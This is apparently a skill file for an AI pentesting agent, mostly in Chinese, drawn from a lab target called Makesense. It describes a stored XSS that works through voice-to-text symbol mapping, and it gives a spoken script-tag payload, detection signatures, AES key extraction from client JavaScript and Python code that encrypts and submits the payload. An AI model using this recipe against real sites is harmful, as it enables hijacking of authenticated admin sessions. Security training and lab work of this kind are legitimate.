---
name: 'voice-symbol-xss'
description: 'XSS via voice-to-text symbol mapping：语音词''''open bracket'''' → `<`。来源 Makesense whisper-wrapper.js。'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## XSS via Voice/Text Symbol Mapping

**来源**: Makesense 靶机的 `whisper-wrapper.js` — `applySymbolMapping()` 函数

### 攻击原理

客户端 JS 将语音识别结果中的特定短语映射为 HTML 符号：

```javascript
const mappings = {
    'open bracket': '<',
    'close bracket': '>',
    'slash': '/',
    'quote': "'",
    'double quote': '"',
    'dot': '.',
    // ... 等 20+ 个符号映射
};
```

用户对着麦克风说："open bracket script close bracket alert open parenthesis quote XSS quote close parenthesis semi colon open bracket slash script close bracket"

→ 映射为 `<script>alert('XSS');</script>`

然后该文本通过 AES-GCM 加密 → AJAX 提交 → 服务端解密 → 存入数据库 → 显示在管理页面

### 检测特征

- JS 文件中搜索：`applySymbolMapping`、`mappings`、`open bracket`、`close bracket`
- 语音转文字 + 符号映射 = 故意设计的 XSS 入口
- 常见伴随：客户端 AES 密钥暴露（用于加密 payload）、admin bot 定期访问

### 利用条件

1. 需要知道 AES 密钥（从 JS 中提取）
2. Admin bot 访问存储的 XSS payload 时会触发
3. Bot 必须已认证（本案例中 bot 已登录 wp-admin）

### 代码示例（Python 构造加密 payload）

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib, json, os, base64

key_str = 'extracted_from_js'
key_material = hashlib.sha256(key_str.encode()).digest()
aesgcm = AESGCM(key_material)

xss = '<script>...</script>'
payload = {'transcription': xss, 'summary': 'x'}
plaintext = json.dumps(payload).encode()
iv = os.urandom(12)
ciphertext = aesgcm.encrypt(iv, plaintext, None)
encrypted = base64.b64encode(iv + ciphertext).decode()
# POST to save_voice_results endpoint
```

### 相关：AES-GCM 密钥提取

在 JS 中搜索常量定义模式：
- `const ENCRYPTION_KEY = '...'`
- `const KEY = '...'`
- 密钥长度通常 32 字符（SHA-256 derived）
